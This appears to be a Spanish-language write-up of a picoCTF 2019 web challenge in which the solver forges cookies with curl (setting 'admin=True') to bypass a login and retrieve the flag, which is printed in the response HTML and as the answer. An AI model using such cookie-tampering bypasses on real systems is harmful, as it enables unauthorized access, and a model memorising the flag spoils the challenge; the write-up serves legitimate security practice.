#Software #Hacking #WebExplotation #Web  #Redes 
# Definición
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573
# Hints
- Hmm it doesn't seem to check anyone's password, except for Joe's?
# Solución
1. Tratamos de entrar con joe, pero no tenemos la contraseña.
2. Por lo que probamos entrar con otro usuario, y si bien nos deja entrar, no nos regresa la bandera.
3. Por lo que inspeccionamos la [[Red]] para ver como se maneja la solicitud.
4. Usamos curl para loggearnos como administrados en la página:
```bash
curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=juan; password=a; admin=True"
```

Y obtenemos las bandera dentro del código:
```bash
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

</html>
```
## Respuesta
picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}